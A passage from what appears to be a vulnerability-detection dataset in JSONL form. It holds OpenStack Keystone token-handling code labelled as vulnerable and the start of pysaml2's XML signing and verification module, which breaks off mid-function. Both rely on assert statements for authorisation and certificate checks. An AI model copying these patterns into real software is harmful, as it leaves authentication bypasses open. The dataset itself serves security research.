tenant_ref['id']\n            else:\n                tenant_id = auth.get('tenantId', None)\n\n            try:\n                old_token_ref = self.token_api.get_token(context=context,\n                                                         token_id=token)\n            except exception.NotFound:\n                raise exception.Unauthorized()\n\n            user_ref = old_token_ref['user']\n\n            tenants = self.identity_api.get_tenants_for_user(context,\n                                                             user_ref['id'])\n            if tenant_id:\n                assert tenant_id in tenants\n\n            tenant_ref = self.identity_api.get_tenant(context=context,\n                                                      tenant_id=tenant_id)\n            if tenant_ref:\n                metadata_ref = self.identity_api.get_metadata(\n                        context=context,\n                        user_id=user_ref['id'],\n                        tenant_id=tenant_ref['id'])\n                catalog_ref = self.catalog_api.get_catalog(\n                        context=context,\n                        user_id=user_ref['id'],\n                        tenant_id=tenant_ref['id'],\n                        metadata=metadata_ref)\n            else:\n                metadata_ref = {}\n                catalog_ref = {}\n\n            token_ref = self.token_api.create_token(\n                    context, token_id, dict(id=token_id,\n                                            user=user_ref,\n                                            tenant=tenant_ref,\n                                            metadata=metadata_ref))\n\n        # TODO(termie): optimize this call at some point and put it into the\n        #               the return for metadata\n        # fill out the roles in the metadata\n        roles_ref = []\n        for role_id in metadata_ref.get('roles', []):\n            roles_ref.append(self.identity_api.get_role(context, role_id))\n        logging.debug('TOKEN_REF %s', token_ref)\n        return self._format_authenticate(token_ref, roles_ref, catalog_ref)\n\n    def _get_token_ref(self, context, token_id, belongs_to=None):\n        \"\"\"Returns a token if a valid one exists.\n\n        Optionally, limited to a token owned by a specific tenant.\n\n        \"\"\"\n        # TODO(termie): this stuff should probably be moved to middleware\n        self.assert_admin(context)\n\n        token_ref = self.token_api.get_token(context=context,\n                                             token_id=token_id)\n\n        if belongs_to:\n            assert token_ref['tenant']['id'] == belongs_to\n\n        return token_ref\n\n    # admin only\n    def validate_token_head(self, context, token_id):\n        \"\"\"Check that a token is valid.\n\n        Optionally, also ensure that it is owned by a specific tenant.\n\n        Identical to ``validate_token``, except does not return a response.\n\n        \"\"\"\n        belongs_to = context['query_string'].get(\"belongsTo\")\n        assert self._get_token_ref(context, token_id, belongs_to)\n\n    # admin only\n    def validate_token(self, context, token_id):\n        \"\"\"Check that a token is valid.\n\n        Optionally, also ensure that it is owned by a specific tenant.\n\n        Returns metadata about the token along any associated roles.\n\n        \"\"\"\n        belongs_to = context['query_string'].get(\"belongsTo\")\n        token_ref = self._get_token_ref(context, token_id, belongs_to)\n\n        # TODO(termie): optimize this call at some point and put it into the\n        #               the return for metadata\n        # fill out the roles in the metadata\n        metadata_ref = token_ref['metadata']\n        roles_ref = []\n        for role_id in metadata_ref.get('roles', []):\n            roles_ref.append(self.identity_api.get_role(context, role_id))\n\n        # Get a service catalog if belongs_to is not none\n        # This is needed for on-behalf-of requests\n        catalog_ref = None\n        if belongs_to is not None:\n            catalog_ref = self.catalog_api.get_catalog(\n                context=context,\n                user_id=token_ref['user']['id'],\n                tenant_id=token_ref['tenant']['id'],\n                metadata=metadata_ref)\n        return self._format_token(token_ref, roles_ref, catalog_ref)\n\n    def delete_token(self, context, token_id):\n        \"\"\"Delete a token, effectively invalidating it for authz.\"\"\"\n        # TODO(termie): this stuff should probably be moved to middleware\n        self.assert_admin(context)\n\n        self.token_api.delete_token(context=context, token_id=token_id)\n\n    def endpoints(self, context, token_id):\n        \"\"\"Return a list of endpoints available to the token.\"\"\"\n        raise exception.NotImplemented()\n\n    def _format_authenticate(self, token_ref, roles_ref, catalog_ref):\n        o = self._format_token(token_ref, roles_ref)\n        o['access']['serviceCatalog'] = self._format_catalog(catalog_ref)\n        return o\n\n    def _format_token(self, token_ref, roles_ref, catalog_ref=None):\n        user_ref = token_ref['user']\n        metadata_ref = token_ref['metadata']\n        expires = token_ref['expires']\n        if expires is not None:\n            expires = utils.isotime(expires)\n        o = {'access': {'token': {'id': token_ref['id'],\n                                  'expires': expires,\n                                  },\n                        'user': {'id': user_ref['id'],\n                                 'name': user_ref['name'],\n                                 'username': user_ref['name'],\n                                 'roles': roles_ref,\n                                 'roles_links': metadata_ref.get('roles_links',\n                                                               [])\n                                 }\n                        }\n             }\n        if 'tenant' in token_ref and token_ref['tenant']:\n            token_ref['tenant']['enabled'] = True\n            o['access']['token']['tenant'] = token_ref['tenant']\n        if catalog_ref is not None:\n            o['access']['serviceCatalog'] = self._format_catalog(catalog_ref)\n        return o\n\n    def _format_catalog(self, catalog_ref):\n        \"\"\"Munge catalogs from internal to output format\n        Internal catalogs look like:\n\n        {$REGION: {\n            {$SERVICE: {\n                $key1: $value1,\n                ...\n                }\n            }\n        }\n\n        The legacy api wants them to look like\n\n        [{'name': $SERVICE[name],\n          'type': $SERVICE,\n          'endpoints': [{\n              'tenantId': $tenant_id,\n              ...\n              'region': $REGION,\n              }],\n          'endpoints_links': [],\n         }]\n\n        \"\"\"\n        if not catalog_ref:\n            return {}\n\n        services = {}\n        for region, region_ref in catalog_ref.iteritems():\n            for service, service_ref in region_ref.iteritems():\n                new_service_ref = services.get(service, {})\n                new_service_ref['name'] = service_ref.pop('name')\n                new_service_ref['type'] = service\n                new_service_ref['endpoints_links'] = []\n                service_ref['region'] = region\n\n                endpoints_ref = new_service_ref.get('endpoints', [])\n                endpoints_ref.append(service_ref)\n\n                new_service_ref['endpoints'] = endpoints_ref\n                services[service] = new_service_ref\n\n        return services.values()\n\n\nclass ExtensionsController(wsgi.Application):\n    \"\"\"Base extensions controller to be extended by public and admin API's.\"\"\"\n\n    def __init__(self, extensions=None):\n        super(ExtensionsController, self).__init__()\n\n        self.extensions = extensions or {}\n\n    def get_extensions_info(self, context):\n        return {'extensions': {'values': self.extensions.values()}}\n\n    def get_extension_info(self, context, extension_alias):\n        try:\n            return {'extension': self.extensions[extension_alias]}\n        except KeyError:\n            raise exception.NotFound(target=extension_alias)\n\n\nclass PublicExtensionsController(ExtensionsController):\n    pass\n\n\nclass AdminExtensionsController(ExtensionsController):\n    def __init__(self, *args, **kwargs):\n        super(AdminExtensionsController, self).__init__(*args, **kwargs)\n\n        # TODO(dolph): Extensions should obviously provide this information\n        #               themselves, but hardcoding it here allows us to match\n        #               the API spec in the short term with minimal complexity.\n        self.extensions['OS-KSADM'] = {\n            'name': 'Openstack Keystone Admin',\n            'namespace': 'http://docs.openstack.org/identity/api/ext/'\n                         'OS-KSADM/v1.0',\n            'alias': 'OS-KSADM',\n            'updated': '2011-08-19T13:25:27-06:00',\n            'description': 'Openstack extensions to Keystone v2.0 API '\n                           'enabling Admin Operations.',\n            'links': [\n                {\n                    'rel': 'describedby',\n                    # TODO(dolph): link needs to be revised after\n                    #              bug 928059 merges\n                    'type': 'text/html',\n                    'href': ('https://github.com/openstack/'\n                        'identity-api'),\n                }\n            ]\n        }\n\n\n@logging.fail_gracefully\ndef public_app_factory(global_conf, **local_conf):\n    conf = global_conf.copy()\n    conf.update(local_conf)\n    return PublicRouter()\n\n\n@logging.fail_gracefully\ndef admin_app_factory(global_conf, **local_conf):\n    conf = global_conf.copy()\n    conf.update(local_conf)\n    return AdminRouter()\n\n\n@logging.fail_gracefully\ndef public_version_app_factory(global_conf, **local_conf):\n    conf = global_conf.copy()\n    conf.update(local_conf)\n    return PublicVersionRouter()\n\n\n@logging.fail_gracefully\ndef admin_version_app_factory(global_conf, **local_conf):\n    conf = global_conf.copy()\n    conf.update(local_conf)\n    return AdminVersionRouter()\n", "target": 1}
{"idx": 1000, "func": "\"\"\" Functions connected to signing and verifying.\nBased on the use of xmlsec1 binaries and not the python xmlsec module.\n\"\"\"\nfrom OpenSSL import crypto\n\nimport base64\nimport hashlib\nimport itertools\nimport logging\nimport os\nimport six\n\nfrom time import mktime\n\nfrom six.moves.urllib import parse\n\nimport saml2.cryptography.asymmetric\nimport saml2.cryptography.pki\n\nfrom tempfile import NamedTemporaryFile\nfrom subprocess import Popen\nfrom subprocess import PIPE\n\nfrom saml2 import samlp\nfrom saml2 import SamlBase\nfrom saml2 import SAMLError\nfrom saml2 import extension_elements_to_elements\nfrom saml2 import class_name\nfrom saml2 import saml\nfrom saml2 import ExtensionElement\nfrom saml2 import VERSION\n\nfrom saml2.cert import OpenSSLWrapper\nfrom saml2.extension import pefim\nfrom saml2.extension.pefim import SPCertEnc\nfrom saml2.saml import EncryptedAssertion\n\nimport saml2.xmldsig as ds\n\nfrom saml2.s_utils import sid\nfrom saml2.s_utils import Unsupported\n\nfrom saml2.time_util import instant\nfrom saml2.time_util import str_to_time\n\nfrom saml2.xmldsig import SIG_RSA_SHA1\nfrom saml2.xmldsig import SIG_RSA_SHA224\nfrom saml2.xmldsig import SIG_RSA_SHA256\nfrom saml2.xmldsig import SIG_RSA_SHA384\nfrom saml2.xmldsig import SIG_RSA_SHA512\nfrom saml2.xmlenc import EncryptionMethod\nfrom saml2.xmlenc import EncryptedKey\nfrom saml2.xmlenc import CipherData\nfrom saml2.xmlenc import CipherValue\nfrom saml2.xmlenc import EncryptedData\n\n\nlogger = logging.getLogger(__name__)\n\nSIG = '{{{ns}#}}{attribute}'.format(ns=ds.NAMESPACE, attribute='Signature')\n\nRSA_1_5 = 'http://www.w3.org/2001/04/xmlenc#rsa-1_5'\nTRIPLE_DES_CBC = 'http://www.w3.org/2001/04/xmlenc#tripledes-cbc'\n\n\nclass SigverError(SAMLError):\n    pass\n\n\nclass CertificateTooOld(SigverError):\n    pass\n\n\nclass XmlsecError(SigverError):\n    pass\n\n\nclass MissingKey(SigverError):\n    pass\n\n\nclass DecryptError(XmlsecError):\n    pass\n\n\nclass EncryptError(XmlsecError):\n    pass\n\n\nclass SignatureError(XmlsecError):\n    pass\n\n\nclass BadSignature(SigverError):\n    \"\"\"The signature is invalid.\"\"\"\n    pass\n\n\nclass CertificateError(SigverError):\n    pass\n\n\ndef read_file(*args, **kwargs):\n    with open(*args, **kwargs) as handler:\n        return handler.read()\n\n\ndef rm_xmltag(statement):\n    XMLTAG = \"<?xml version='1.0'?>\"\n    PREFIX1 = \"<?xml version='1.0' encoding='UTF-8'?>\"\n    PREFIX2 = '<?xml version=\"1.0\" encoding=\"UTF-8\"?>'\n\n    try:\n        _t = statement.startswith(XMLTAG)\n    except TypeError:\n        statement = statement.decode()\n        _t = statement.startswith(XMLTAG)\n\n    if _t:\n        statement = statement[len(XMLTAG):]\n        if statement[0] == '\\n':\n            statement = statement[1:]\n    elif statement.startswith(PREFIX1):\n        statement = statement[len(PREFIX1):]\n        if statement[0] == '\\n':\n            statement = statement[1:]\n    elif statement.startswith(PREFIX2):\n        statement = statement[len(PREFIX2):]\n        if statement[0] == '\\n':\n            statement = statement[1:]\n\n    return statement\n\n\ndef signed(item):\n    \"\"\"\n    Is any part of the document signed ?\n\n    :param item: A Samlbase instance\n    :return: True if some part of it is signed\n    \"\"\"\n    if SIG in item.c_children.keys() and item.signature:\n        return True\n    else:\n        for prop in item.c_child_order:\n            child = getattr(item, prop, None)\n            if isinstance(child, list):\n                for chi in child:\n                    if signed(chi):\n                        return True\n            elif child and signed(child):\n                return True\n\n    return False\n\n\ndef get_xmlsec_binary(paths=None):\n    \"\"\"\n    Tries to find the xmlsec1 binary.\n\n    :param paths: Non-system path paths which should be searched when\n        looking for xmlsec1\n    :return: full name of the xmlsec1 binary found. If no binaries are\n        found then an exception is raised.\n    \"\"\"\n    if os.name == 'posix':\n        bin_name = ['xmlsec1']\n    elif os.name == 'nt':\n        bin_name = ['xmlsec.exe', 'xmlsec1.exe']\n    else:  # Default !?\n        bin_name = ['xmlsec1']\n\n    if paths:\n        for bname in bin_name:\n            for path in paths:\n                fil = os.path.join(path, bname)\n                try:\n                    if os.lstat(fil):\n                        return fil\n                except OSError:\n                    pass\n\n    for path in os.environ['PATH'].split(os.pathsep):\n        for bname in bin_name:\n            fil = os.path.join(path, bname)\n            try:\n                if os.lstat(fil):\n                    return fil\n            except OSError:\n                pass\n\n    raise SigverError('Cannot find {binary}'.format(binary=bin_name))\n\n\ndef _get_xmlsec_cryptobackend(path=None, search_paths=None, delete_tmpfiles=True):\n    \"\"\"\n    Initialize a CryptoBackendXmlSec1 crypto backend.\n\n    This function is now internal to this module.\n    \"\"\"\n    if path is None:\n        path = get_xmlsec_binary(paths=search_paths)\n    return CryptoBackendXmlSec1(path, delete_tmpfiles=delete_tmpfiles)\n\n\nNODE_NAME = 'urn:oasis:names:tc:SAML:2.0:assertion:Assertion'\nENC_NODE_NAME = 'urn:oasis:names:tc:SAML:2.0:assertion:EncryptedAssertion'\nENC_KEY_CLASS = 'EncryptedKey'\n\n\ndef _make_vals(val, klass, seccont, klass_inst=None, prop=None, part=False,\n               base64encode=False, elements_to_sign=None):\n    \"\"\"\n    Creates a class instance with a specified value, the specified\n    class instance may be a value on a property in a defined class instance.\n\n    :param val: The value\n    :param klass: The value class\n    :param klass_inst: The class instance which has a property on which\n        what this function returns is a value.\n    :param prop: The property which the value should be assigned to.\n    :param part: If the value is one of a possible list of values it should be\n        handled slightly different compared to if it isn't.\n    :return: Value class instance\n    \"\"\"\n    cinst = None\n\n    if isinstance(val, dict):\n        cinst = _instance(klass, val, seccont, base64encode=base64encode,\n                          elements_to_sign=elements_to_sign)\n    else:\n        try:\n            cinst = klass().set_text(val)\n        except ValueError:\n            if not part:\n                cis = [\n                    _make_vals(\n                        sval,\n                        klass,\n                        seccont,\n                        klass_inst,\n                        prop,\n                        True,\n                        base64encode,\n                        elements_to_sign)\n                    for sval in val\n                ]\n                setattr(klass_inst, prop, cis)\n            else:\n                raise\n\n    if part:\n        return cinst\n    else:\n        if cinst:\n            cis = [cinst]\n            setattr(klass_inst, prop, cis)\n\n\ndef _instance(klass, ava, seccont, base64encode=False, elements_to_sign=None):\n    instance = klass()\n\n    for prop in instance.c_attributes.values():\n        if prop in ava:\n            if isinstance(ava[prop], bool):\n                setattr(instance, prop, str(ava[prop]).encode())\n            elif isinstance(ava[prop], int):\n                setattr(instance, prop, str(ava[prop]))\n            else:\n                setattr(instance, prop, ava[prop])\n\n    if 'text' in ava:\n        instance.set_text(ava['text'], base64encode)\n\n    for prop, klassdef in instance.c_children.values():\n        if prop in ava:\n            if isinstance(klassdef, list):\n                # means there can be a list of values\n                _make_vals(ava[prop], klassdef[0], seccont, instance, prop,\n                           base64encode=base64encode,\n                           elements_to_sign=elements_to_sign)\n            else:\n                cis = _make_vals(ava[prop], klassdef, seccont, instance, prop,\n                                 True, base64encode, elements_to_sign)\n                setattr(instance, prop, cis)\n\n    if 'extension_elements' in ava:\n        for item in ava['extension_elements']:\n            instance.extension_elements.append(\n                ExtensionElement(item['tag']).loadd(item))\n\n    if 'extension_attributes' in ava:\n        for key, val in ava['extension_attributes'].items():\n            instance.extension_attributes[key] = val\n\n    if 'signature' in ava:\n        elements_to_sign.append((class_name(instance), instance.id))\n\n    return instance\n\n\ndef signed_instance_factory(instance, seccont, elements_to_sign=None):\n    \"\"\"\n\n    :param instance: The instance to be signed or not\n    :param seccont: The security context\n    :param elements_to_sign: Which parts if any that should be signed\n    :return: A class instance if not signed otherwise a string\n    \"\"\"\n    if elements_to_sign:\n        signed_xml = instance\n        if not isinstance(instance, six.string_types):\n            signed_xml = instance.to_string()\n        for (node_name, nodeid) in elements_to_sign:\n            signed_xml = seccont.sign_statement(\n                signed_xml, node_name=node_name, node_id=nodeid)\n        return signed_xml\n    else:\n        return instance\n\n\ndef make_temp(content, suffix=\"\", decode=True, delete_tmpfiles=True):\n    \"\"\"\n    Create a temporary file with the given content.\n\n    This is needed by xmlsec in some cases where only strings exist when files\n    are expected.\n\n    :param content: The information to be placed in the file\n    :param suffix: The temporary file might have to have a specific\n        suffix in certain circumstances.\n    :param decode: The input content might be base64 coded. If so it\n        must, in some cases, be decoded before being placed in the file.\n    :param delete_tmpfiles: Whether to keep the tmp files or delete them when they are\n        no longer in use\n    :return: 2-tuple with file pointer ( so the calling function can\n        close the file) and filename (which is for instance needed by the\n        xmlsec function).\n    \"\"\"\n    content_encoded = (\n        content.encode(\"utf-8\") if not isinstance(content, six.binary_type) else content\n    )\n    content_raw = base64.b64decode(content_encoded) if decode else content_encoded\n    ntf = NamedTemporaryFile(suffix=suffix, delete=delete_tmpfiles)\n    ntf.write(content_raw)\n    ntf.seek(0)\n    return ntf\n\n\ndef split_len(seq, length):\n    return [seq[i:i + length] for i in range(0, len(seq), length)]\n\n\nM2_TIME_FORMAT = '%b %d %H:%M:%S %Y'\n\n\ndef to_time(_time):\n    assert _time.endswith(' GMT')\n    _time = _time[:-4]\n    return mktime(str_to_time(_time, M2_TIME_FORMAT))\n\n\ndef active_cert(key):\n    \"\"\"\n    Verifies that a key is active that is present time is after not_before\n    and before not_after.\n\n    :param key: The Key\n    :return: True if the key is active else False\n    \"\"\"\n    try:\n        cert_str = pem_format(key)\n        cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_str)\n        assert cert.has_expired() == 0\n        assert not OpenSSLWrapper().certificate_not_valid_yet(cert)\n        return True\n    except AssertionError:\n        return False\n    except AttributeError:\n        return False\n\n\ndef cert_from_key_info(key_info, ignore_age=False):\n    \"\"\" Get all X509 certs from a KeyInfo instance. Care is taken to make sure\n    that the certs are continues sequences of bytes.\n\n    All certificates appearing in an X509Data element MUST relate to the\n    validation key by either containing it or being part of a certification\n    chain that terminates in a certificate containing the validation key.\n\n    :param key_info: The KeyInfo instance\n    :return: A possibly empty list of certs\n    \"\"\"\n    res = []\n    for x509_data in key_info.x509_data:\n        x509_certificate = x509_data.x509_certificate\n        cert = x509_certificate.text.strip()\n        cert = '\\n'.join(split_len(''.join([s.strip() for s in\n                                            cert.split()]), 64))\n        if ignore_age or active_cert(cert):\n            res.append(cert)\n        else:\n            logger.info('Inactive cert')\n    return res\n\n\ndef cert_from_key_info_dict(key_info, ignore_age=False):\n    \"\"\" Get all X509 certs from a KeyInfo dictionary. Care is taken to make sure\n    that the certs are continues sequences of bytes.\n\n    All certificates appearing in an X509Data element MUST relate to the\n    validation key by either containing it or being part of a certification\n    chain that terminates in a certificate containing the validation key.\n\n    :param key_info: The KeyInfo dictionary\n    :return: A possibly empty list of certs in their text representation\n    \"\"\"\n    res = []\n    if 'x509_data' not in key_info:\n        return res\n\n    for x509_data in key_info['x509_data']:\n        x509_certificate = x509_data['x509_certificate']\n        cert = x509_certificate['text'].strip()\n        cert = '\\n'.join(split_len(''.join(\n            [s.strip() for s in cert.split()]), 64))\n        if ignore_age or active_cert(cert):\n            res.append(cert)\n        else:\n            logger.info('Inactive cert')\n    return res\n\n\ndef cert_from_instance(instance):\n    \"\"\" Find certificates that are part of an instance\n\n    :param instance: An instance\n    :return: possible empty list of certificates\n    \"\"\"\n    if instance.signature:\n        if instance.signature.key_info:\n            return cert_from_key_info(instance.signature.key_info,\n                                      ignore_age=True)\n    return []\n\n\ndef extract_rsa_key_from_x509_cert(pem):\n    cert = saml2.cryptography.pki.load_pem_x509_certificate(pem)\n    return cert.public_key()\n\n\ndef pem_format(key):\n    return '\\n'.join([\n        '-----BEGIN CERTIFICATE-----',\n        key,\n        '-----END CERTIFICATE-----'\n    ]).encode('ascii')\n\n\ndef import_rsa_key_from_file(filename):\n    data = read_file(filename, 'rb')\n    key = saml2.cryptography.asymmetric.load_pem_private_key(data, None)\n    return key\n\n\ndef parse_xmlsec_output(output):\n    \"\"\" Parse the output from xmlsec to try to find out if the\n    command was successfull or not.\n\n    :param output: The output from Popen\n    :return: A boolean; True if the command was a success otherwise False\n    \"\"\"\n    for line in output.splitlines():\n        if line == 'OK':\n            return True\n        elif line == 'FAIL':\n            raise XmlsecError(output)\n    raise XmlsecError(output)\n\n\ndef sha1_digest(msg):\n    return hashlib.sha1(msg).digest()\n\n\nclass Signer(object):\n    \"\"\"Abstract base class for signing algorithms.\"\"\"\n\n    def __init__(self, key):\n        self.key = key\n\n    def sign(self, msg, key):\n        \"\"\"Sign ``msg`` with ``key`` and return the signature.\"\"\"\n        raise NotImplementedError\n\n    def verify(self, msg, sig, key):\n        \"\"\"Return True if ``sig`` is a valid signature for ``msg``.\"\"\"\n        raise NotImplementedError\n\n\nclass RSASigner(Signer):\n    def __init__(self, digest, key=None):\n        Signer.__init__(self, key)\n        self.digest = digest\n\n    def sign(self, msg, key=None):\n        return saml2.cryptography.asymmetric.key_sign(\n                key or self.key, msg, self.digest)\n\n    def verify(self, msg, sig, key=None):\n        return saml2.cryptography.asymmetric.key_verify(\n                key or self.key, sig, msg, self.digest)\n\n\nSIGNER_ALGS = {\n    SIG_RSA_SHA1: RSASigner(saml2.cryptography.asymmetric.hashes.SHA1()),\n    SIG_RSA_SHA224: RSASigner(saml2.cryptography.asymmetric.hashes.SHA224()),\n    SIG_RSA_SHA256: RSASigner(saml2.cryptography.asymmetric.hashes.SHA256()),\n    SIG_RSA_SHA384: RSASigner(saml2.cryptography.asymmetric.hashes.SHA384()),\n    SIG_RSA_SHA512: RSASigner(saml2.cryptography.asymmetric.hashes.SHA512()),\n}\n\nREQ_ORDER = [\n    'SAMLRequest',\n    'RelayState',\n    'SigAlg',\n]\n\nRESP_ORDER = [\n    'SAMLResponse',\n    'RelayState',\n    'SigAlg',\n]\n\n\nclass RSACrypto(object):\n    def __init__(self, key):\n        self.key = key\n\n    def get_signer(self, sigalg, sigkey=None):\n        try:\n            signer = SIGNER_ALGS[sigalg]\n        except KeyError:\n            return None\n        else:\n            if sigkey:\n                signer.key = sigkey\n            else:\n                signer.key = self.key\n\n        return signer\n\n\ndef verify_redirect_signature(saml_msg, crypto, cert=None, sigkey=None):\n    \"\"\"\n\n    :param saml_msg: A dictionary with strings as values, *NOT* lists as\n    produced by parse_qs.\n    :param cert: A certificate to use when verifying the signature\n    :return: True, if signature verified\n    \"\"\"\n\n    try:\n        signer = crypto.get_signer(saml_msg['SigAlg'], sigkey)\n    except KeyError:\n        raise Unsupported('Signature algorithm: {alg}'.format(\n            alg=saml_msg['SigAlg']))\n    else:\n        if saml_msg['SigAlg'] in SIGNER_ALGS:\n            if 'SAMLRequest' in saml_msg:\n                _order = REQ_ORDER\n            elif 'SAMLResponse' in saml_msg:\n                _order = RESP_ORDER\n            else:\n                raise Unsupported(\n                    'Verifying signature on something that should not be '\n                    'signed')\n            _args = saml_msg.copy()\n            del _args['Signature']  # everything but the signature\n            string = '&'.join(\n                [parse.urlencode({k: _args[k]}) for k in _order if k in\n                 _args]).encode('ascii')\n\n            if cert:\n                _key = extract_rsa_key_from_x509_cert(pem_format(cert))\n            else:\n                _key = sigkey\n\n            _sign = base64.b64decode(saml_msg['Signature'])\n\n            return bool(signer.verify(string, _sign, _key))\n\n\ndef make_str(txt):\n    if isinstance(txt, six.string_types):\n        return txt\n    else:\n        return txt.decode()\n\n\ndef read_cert_from_file(cert_file, cert_type):\n    \"\"\" Reads a certificate from a file. The assumption is that there is\n    only one certificate in the file\n\n    :param cert_file: The name of the file\n    :param cert_type: The certificate type\n    :return: A base64 encoded certificate as a string or the empty string\n    \"\"\"\n\n    if not cert_file:\n        return ''\n\n    if cert_type == 'pem':\n        _a = read_file(cert_file, 'rb').decode()\n        _b = _a.replace('\\r\\n', '\\n')\n        lines = _b.split('\\n')\n\n        for pattern in (\n                '-----BEGIN CERTIFICATE-----',\n                '-----BEGIN PUBLIC KEY-----'):\n            if pattern in lines:\n                lines = lines[lines.index(pattern) + 1:]\n                break\n        else:\n            raise CertificateError('Strange beginning of PEM file')\n\n        for pattern in (\n                '-----END CERTIFICATE-----',\n                '-----END PUBLIC KEY-----'):\n            if pattern in lines:\n                lines = lines[:lines.index(pattern)]\n                break\n        else:\n            raise CertificateError('Strange end of PEM file')\n        return make_str(''.join(lines).encode())\n\n    if cert_type in ['der', 'cer', 'crt']:\n        data = read_file(cert_file, 'rb')\n        _cert = base64.b64encode(data)\n        return make_str(_cert)\n\n\nclass CryptoBackend(object):\n    def version(self):\n        raise NotImplementedError()\n\n    def encrypt(self, text, recv_key, template, key_type):\n        raise NotImplementedError()\n\n    def encrypt_assertion(self, statement, enc_key, template, key_type, node_xpath):\n        raise NotImplementedError()\n\n    def decrypt(self, enctext, key_file, id_attr):\n        raise NotImplementedError()\n\n    def sign_statement(self, statement, node_name, key_file, node_id, id_attr):\n        raise NotImplementedError()\n\n    def validate_signature(self, enctext, cert_file, cert_type, node_name, node_id, id_attr):\n        raise NotImplementedError()\n\n\nASSERT_XPATH = ''.join([\n    '/*[local-name()=\\'{name}\\']'.format(name=n)\n    for n in ['Response', 'EncryptedAssertion', 'Assertion']\n])\n\n\nclass CryptoBackendXmlSec1(CryptoBackend):\n    \"\"\"\n    CryptoBackend implementation using external binary 1 to sign\n    and verify XML documents.\n    \"\"\"\n\n    __DEBUG = 0\n\n    def __init__(self, xmlsec_binary, delete_tmpfiles=True, **kwargs):\n        CryptoBackend.__init__(self, **kwargs)\n        assert (isinstance(xmlsec_binary, six.string_types))\n        self.xmlsec = xmlsec_binary\n        self.delete_tmpfiles = delete_tmpfiles\n        try:\n            self.non_xml_crypto = RSACrypto(kwargs['rsa_key'])\n        except KeyError:\n            pass\n\n    def version(self):\n        com_list = [self.xmlsec, '--version']\n        pof = Popen(com_list, stderr=PIPE, stdout=PIPE)\n        content, _ = pof.communicate()\n        content = content.decode('ascii')\n        try:\n            return content.split(' ')[1]\n        except IndexError:\n            return ''\n\n    def encrypt(self, text, recv_key, template, session_key_type, xpath=''):\n        \"\"\"\n\n        :param text: The text to be compiled\n        :param recv_key: Filename of a file where the key resides\n        :param template: Filename of a file with the pre-encryption part\n        :param session_key_type: Type and size of a new session key\n            'des-192' generates a new 192 bits DES key for DES3 encryption\n        :param xpath: What should be encrypted\n        :return:\n        \"\"\"\n        logger.debug('Encryption input len: %d', len(text))\n        tmp = make_temp(text, decode=False, delete_tmpfiles=self.delete_tmpfiles)\n        com_list = [\n            self.xmlsec,\n            '--encrypt',\n            '--pubkey-cert-pem', recv_key,\n            '--session-key', session_key_type,\n            '--xml-data', tmp.name,\n        ]\n\n        if xpath:\n            com_list.extend(['--node-xpath', xpath])\n\n        try:\n            (_stdout, _stderr, output) = self._run_xmlsec(com_list, [template])\n        except XmlsecError as e:\n            six.raise_from(EncryptError(com_list), e)\n\n        return output\n\n    def encrypt_assertion(self, statement, enc_key, template, key_type='des-192', node_xpath=None, node_id=None):\n        \"\"\"\n        Will encrypt an assertion\n\n        :param statement: A XML document that contains the assertion to encrypt\n        :param enc_key: File name of a file containing the encryption key\n        :param template: A template for the encryption part to be added.\n        :param key_type: The type of session key to use.\n        :return: The encrypted text\n        \"\"\"\n        if six.PY2:\n            _str = unicode\n        else:\n            _str = str\n\n        if isinstance(statement, SamlBase):\n            statement = pre_encrypt_assertion(statement)\n\n        tmp = make_temp(_str(statement),\n                        decode=False,\n                        delete_tmpfiles=self.delete_tmpfiles)\n        tmp2 = make_temp(_str(template),\n                         decode=False,\n                         delete_tmpfiles=self.delete_tmpfiles)\n\n        if not node_xpath:\n            node_xpath = ASSERT_XPATH\n\n        com_list = [\n            self.xmlsec,\n            '--encrypt',\n            '--pubkey-cert-pem', enc_key,\n            '--session-key', key_type,\n            '--xml-data', tmp.name,\n            '--node-xpath', node_xpath,\n        ]\n\n        if node_id:\n            com_list.extend(['--node-id', node_id])\n\n        try:\n            (_stdout, _stderr, output) = self._run_xmlsec(com_list, [tmp2.name])\n        except XmlsecError as e:\n            six.raise_from(EncryptError(com_list), e)\n\n        return output.decode('utf-8')\n\n    def decrypt(self, enctext, key_file, id_attr):\n        \"\"\"\n\n        :param enctext: XML document containing an encrypted part\n        :param key_file: The key to use for the decryption\n        :return: The decrypted document\n        \"\"\"\n\n        logger.debug('Decrypt input len: %d', len(enctext))\n        tmp = make_temp(enctext, decode=False, delete_tmpfiles=self.delete_tmpfiles)\n\n        com_list = [\n            self.xmlsec,\n            '--decrypt',\n            '--privkey-pem', key_file,\n            '--id-attr:{id_attr}'.format(id_attr=id_attr),\n            ENC_KEY_CLASS,\n        ]\n\n        try:\n            (_stdout, _stderr, output) = self._run_xmlsec(com_list, [tmp.name])\n        except XmlsecError as e:\n            six.raise_from(DecryptError(com_list), e)\n\n        return output.decode('utf-8')\n\n    def sign_statement(self, statement, node_name, key_file, node_id, id_attr):\n        \"\"\"\n        Sign an XML statement.\n\n        :param statement: The statement to be signed\n        :param node_name: string like 'urn:oasis:names:...:Assertion'\n        :param key_file: The file where the key can be found\n        :param node_id:\n        :param id_attr: The attribute name for the identifier, normally one of\n            'id','Id' or 'ID'\n        :return: The signed statement\n        \"\"\"\n        if isinstance(statement, SamlBase):\n            statement = str(statement)\n\n        tmp = make_temp(statement,\n                        suffix=\".xml\",\n                        decode=False,\n                        delete_tmpfiles=self.delete_tmpfiles)\n\n        com_list = [\n            self.xmlsec,\n            '--sign',\n            '--privkey-pem', key_file,\n            '--id-attr:{id_attr_name}'.format(id_attr_name=id_attr),\n            node_name,\n        ]\n\n        if node_id:\n            com_list.extend(['--node-id', node_id])\n\n        try:\n            (stdout, stderr, output) = self._run_xmlsec(com_list, [tmp.name])\n        except XmlsecError as e:\n            raise SignatureError(com_list)\n\n        # this does not work if --store-signatures is used\n        if output:\n            return output.decode(\"utf-8\")\n        if stdout:\n            return stdout.decode(\"utf-8\")\n        raise SignatureError(stderr)\n\n    def validate_signature(self, signedtext, cert_file, cert_type, node_name, node_id, id_attr):\n        \"\"\"\n        Validate signature on XML document.\n\n        :param signedtext: The XML document as a string\n        :param cert_file: The public key that was used to sign the document\n        :param cert_type: The file type of the certificate\n        :param node_name: The name of the class that is signed\n        :param node_id: The identifier of the node\n        :param id_attr: The attribute name for the identifier, normally one of\n            'id','Id' or 'ID'\n        :return: Boolean True if the signature was correct otherwise False.\n        \"\"\"\n        if not isinstance(signedtext, six.binary_type):\n            signedtext = signedtext.encode('utf-8')\n\n        tmp = make_temp(signedtext,\n                        suffix=\".xml\",\n                        decode=False,\n                        